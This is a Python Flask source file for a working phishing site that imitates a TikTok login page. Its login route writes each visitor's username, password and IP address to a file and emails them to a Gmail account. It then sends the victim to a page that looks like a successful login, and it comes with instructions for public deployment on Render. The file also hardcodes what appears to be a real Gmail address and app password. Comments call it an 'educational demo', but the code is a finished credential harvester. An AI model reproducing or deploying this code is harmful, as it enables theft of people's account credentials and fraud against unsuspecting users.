# app.py

from flask import Flask, render_template, request, redirect, url_for
import smtplib
from email.mime.text import MIMEText
import os # For accessing environment variables

app = Flask(__name__)

# --- IMPORTANT SECURITY NOTE ---
# NEVER hardcode sensitive credentials like passwords directly in your code
# for production environments. Use environment variables or a secure
# configuration management system.
# For this educational demo, you will replace 'YOUR_GMAIL_APP_PASSWORD_HERE'
# with your actual Gmail App Password.
# -------------------------------

# Replace with your controlled email address
EMAIL_ADDRESS = "mwananchihuslerloans@gmail.com"
# Use a Gmail App Password here.
# Generate one from your Google Account security settings.
# For this demo, you will put your actual App Password here:
EMAIL_PASSWORD = "mokasgadsaacljec" # <--- REPLACE THIS WITH YOUR APP PASSWORD
TO_EMAIL = "mwananchihuslerloans@gmail.com" # This is the recipient email

@app.route("/")
def home():
    # This route will serve your login page (e.g., login.html)
    # Ensure you have a 'templates' folder with 'login.html' inside it.
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]

    # --- Credential Logging (for demonstration only) ---
    # In a real scenario, this would be logged securely (e.g., to a database)
    # and not to a flat file that might not persist on cloud platforms.
    try:
        with open("credentials.txt", "a") as f:
            f.write(f"Timestamp: {request.environ.get('REMOTE_ADDR')} - User: {username} | Pass: {password}\n")
        print("Credentials saved to credentials.txt")
    except Exception as e:
        print(f"Error saving credentials to file: {e}")
    # --- End Credential Logging ---

    # --- Email Notification ---
    try:
        # Connect to Gmail's SMTP server securely over SSL
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

            subject = "Phishing Capture Alert"
            body = f"New Phishing Attempt:\n\nUsername: {username}\nPassword: {password}\nIP Address: {request.environ.get('REMOTE_ADDR')}"

            msg = MIMEText(body)
            msg['Subject'] = subject
            msg['From'] = EMAIL_ADDRESS
            msg['To'] = TO_EMAIL

            smtp.send_message(msg)
            print("Credentials sent via email successfully!")

    except Exception as e:
        print(f"Error sending email: {e}")
        # In a real app, you might want to log the error to a system log
        # or a monitoring service, but avoid exposing internal errors to users.

    # Redirect the user to a seemingly legitimate page after "login"
    # For a phishing demo, this would typically be the real TikTok site
    # or a convincing "success" page.
    # For a demo, you can redirect to google.com or a mock success page.
    return redirect(url_for('mock_tiktok_redirect')) # Redirect to a mock success page or real TikTok

# A mock page to redirect to, simulating a "successful" login
@app.route("/redirect_after_login")
def mock_tiktok_redirect():
    # You could redirect to the real TikTok here for a more convincing demo
    # return redirect("https://www.tiktok.com", code=302)
    return "Login successful! Redirecting to TikTok... (This is a mock page for the demo)"

# --- IMPORTANT FOR RENDER DEPLOYMENT ---
# Your Flask app MUST bind to 0.0.0.0 and use the dynamic PORT provided by Render
# for it to be accessible from the internet.
if __name__ == '__main__':
    # Get the port from the environment variable 'PORT' set by Render.
    # Default to 5000 for local development if 'PORT' is not set.
    port = int(os.environ.get('PORT', 5000))
    
    # Run the Flask app, binding to 0.0.0.0 and the dynamic port.
    # debug=True is good for development but should be False in production.
    app.run(host='0.0.0.0', port=port, debug=True)
